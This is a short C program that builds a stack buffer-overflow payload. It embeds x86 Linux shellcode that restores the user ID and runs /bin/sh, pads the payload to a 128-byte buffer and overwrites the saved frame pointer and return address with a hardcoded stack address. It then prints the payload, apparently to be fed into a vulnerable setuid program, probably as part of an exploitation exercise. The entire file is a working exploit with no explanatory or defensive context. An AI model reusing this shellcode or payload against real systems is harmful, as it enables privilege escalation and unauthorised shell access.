#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {
    int buffer_size = 128;
    unsigned char exploit[] = "\x31\xc0\xb0\xc9\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\x68\x2f"
    "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80";
    int ret = 0xffffd428; // find with ltrace?

    // Magic
    int ex_len = strlen(exploit);
    int fill = buffer_size - ex_len; // to fill buff size
    unsigned char buf[ex_len + fill + 4 + 4 + 1]; // ebp then ret address, +1 for \0
    memcpy(buf, exploit, ex_len);
    memset(buf + ex_len, 'N', fill);
    memcpy(buf + ex_len + fill, &ret, 4);
    memcpy(buf + ex_len + fill + 4, &ret, 4);
    buf[ex_len + fill + 4 + 4] = 0;
    printf("%s", buf);
}
